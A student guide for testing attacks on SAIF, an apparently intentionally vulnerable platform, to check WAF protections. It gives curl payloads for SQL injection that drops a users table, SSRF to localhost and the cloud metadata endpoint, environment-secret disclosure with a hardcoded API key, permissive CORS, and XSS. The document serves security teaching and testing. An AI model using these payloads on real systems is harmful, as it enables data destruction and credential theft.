# SAIF Attack Guidance for Students

This document provides practical examples for students to test common attacks on the SAIF platform, especially for evaluating WAF (Web Application Firewall) Layer 7 protections. All tests should be performed in a safe, isolated environment.

---

## 1. SQL Injection

**Test Endpoint:**
`/api/sqlversion?query=...`

**Example Attack:**
```bash
curl "http://<SAIF-API-URL>/api/sqlversion?query=1'; DROP TABLE users; --"
```
- Injects malicious SQL to attempt dropping a table.
- WAF should block or sanitize this request.

---

## 2. Command Injection / SSRF

**Test Endpoint:**
`/api/curl?url=...`

**Example Attacks:**
```bash
curl "http://<SAIF-API-URL>/api/curl?url=http://localhost:80"
curl "http://<SAIF-API-URL>/api/curl?url=http://127.0.0.1:80"
curl "http://<SAIF-API-URL>/api/curl?url=http://169.254.169.254/latest/meta-data/"
```
- Tests for Server-Side Request Forgery and command injection.
- WAF should block requests to internal IPs or metadata endpoints.

---

## 3. Environment Variable Disclosure

**Test Endpoint:**
`/api/printenv`

**Example Attack:**
```bash
curl -H "X-API-Key: insecure_api_key_12345" "http://<SAIF-API-URL>/api/printenv"
```
- Reveals environment variables, including secrets.
- WAF should block or mask sensitive output.

---

## 4. CORS Misconfiguration

**Test:**
Open browser console and run:
```javascript
fetch("http://<SAIF-API-URL>/api/healthcheck")
```
- If CORS is too permissive, requests from any origin will succeed.

---

## 5. Input Validation (XSS, Path Traversal)

**Test Endpoint:**
Any endpoint accepting user input (e.g., `/api/newfeature?input=<script>alert(1)</script>`)

**Example Attack:**
```bash
curl "http://<SAIF-API-URL>/api/newfeature?input=<script>alert(1)</script>"
```
- WAF should block or sanitize script tags.

---

## General Tips

- Replace `<SAIF-API-URL>` with your deployed API endpoint.
- Use tools like Burp Suite, OWASP ZAP, or browser DevTools for advanced testing.
- Document WAF responses (blocked, sanitized, logged) for each attack.

---

**Note:**
SAIF is intentionally vulnerable for educational purposes. Always test in a safe, isolated environment.
